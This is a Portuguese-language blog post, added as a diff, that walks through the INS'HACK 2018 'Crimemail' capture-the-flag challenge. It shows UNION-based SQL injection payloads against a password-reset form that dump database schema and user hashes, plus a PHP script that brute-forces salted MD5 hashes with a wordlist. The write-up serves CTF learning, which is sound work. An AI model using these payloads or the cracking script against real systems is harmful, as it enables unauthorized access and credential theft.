@@ -1,0 +1,99 @@
+---
+title: "INS'HACK - Crimemail Writeup"
+layout: post
+date: 2018-04-07
+categories: writeups
+---
+
+<code>"service, to communicate with his associates.
+<br>
+Let's see if you can hack your way in his account...
+<br>
+Hint: his password's md5 is computed as followed: <code>md5 = md5($password + $salt)</code> and Collins Hackle has a password which can be found in an english dictionary"
+<br></code>
+
+Entrando no site temos um formulario de login simples, lógico que sempre fazemos alguns testes padrões ao vermos formularios de login...
+<br>
+<img src="https://i.imgur.com/aAxVWWy.png">
+Depois de uma ou duas tentativas resolvi entrar no link de "Lost password?", então tinhamos outro fomulario, um formulario muito parecido com os que temos quando realmente entramos em links parecidos...
+<br>
+Fazendo poucos testes aqui conseguimos printar um erro na nossa tela:
+<br>
+<img src="https://i.imgur.com/SdD6gCm.png">
+<br>
+Depois do primeiro erro, a coisa mais lógica a se fazer em um SQLi, é tentar dumpar a quantidade de colunas usando o <code>union</code>
+<img src="https://i.imgur.com/CCr7Iln.png">
+<br>
+<img src="https://i.imgur.com/jjeqTSE.png">
+<br>
+<img src="https://i.imgur.com/9jIQY9Z.png">
+<br>
+<img src="https://i.imgur.com/nMRG3A9.png">
+<br>
+<img src="https://i.imgur.com/eWKJJw1.png">
+<br>
+<img src="https://i.imgur.com/RZywjQ2.png">
+<br>
+Depois que descobri que só <code>"havia"</code> uma coluna, resovi enviar fazer o dump.
+<br>
+{% highlight sql %}
+' union select concat(table_name,":",column_name) from information_schema.columns#
+{% endhighlight %}
+<br>
+<img src="https://i.imgur.com/Vd0mdl1.png">
+<br>
+Olhando o dump, no final conseui achar aquilo que eu precisava:
+<br>
+<img src="https://i.imgur.com/Qw9aAQE.png">
+<br>
+Com o nome completo da tabela e das colunas, ficou mais facil de conseguir o dump do conteudo.
+<br>
+Usando o seguinte payload, fiz o dump dos conteudos presentes em todas as colunas da tabela <code>users</code>.
+<br>
+{% highlight sql %}
+' union select concat(userID,":",username,":",pass_salt,":",pass_md5) from users#
+{% endhighlight %}
+<br>
+<img src="https://i.imgur.com/IzfwEk4.png">
+<br>
+Ok, temos o conteudo do dump, mas a senhas estão sendo com um hash com salt:
+<br>
+<img src="https://i.imgur.com/lFVbuRF.png">
+<br>
+Neste momento, resolvi desenvolver meu proprio script para fazer um brute force:
+<br>
+{% highlight php %}
+<?php
+
+$salt = "Kujh";
+
+$salts = ["Jdhy","Kujh","hTjl","YbEr","yhbG"];
+if ($file = fopen("rockyou.txt", "r")) {
+    while(!feof($file)) {
+	$line = fgets($file);
+	$line = str_replace("\n","",$line);
+	for($i=0; $i<count($salts);$i++){
+		$salt = $salts[$i];
+		echo "TENTANDO: " . $line." || MD5: ".md5($line.$salt)."\n";
+		if(md5($line.$salt) == "f2b31b3a7a7c41093321d0c98c37f5ad"){
+			exit("Find:".$line."");
+		}
+	}
+	$i=0;
+    }
+    fclose($file);
+}
+
+{% endhighlight %}
+<br>
+Depois de alguns instantes, a senha apareceu:
+<br>
+<img src="">
+<br>
+<code>pizza</code> é a senha do usuario que precisamos :).
+<br>
+<img src="https://i.imgur.com/INAkOZS.png">
+<br>
+Então fiz o login com as credências <code>c.hackle:pizza</code>.
+<br>
+<img src="https://i.imgur.com/rEQsmfH.png">
